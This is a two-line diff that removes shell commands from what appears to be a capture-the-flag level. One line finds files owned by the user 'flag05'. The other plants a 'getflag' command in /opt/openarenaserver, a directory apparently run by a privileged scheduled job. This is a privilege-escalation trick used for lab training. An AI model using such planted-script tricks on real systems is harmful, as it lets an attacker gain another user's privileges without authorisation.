@@ -1,2 +1,0 @@
-find  / -user flag05
-echo "getflag > /tmp/ola" > /opt/openarenaserver/exploit
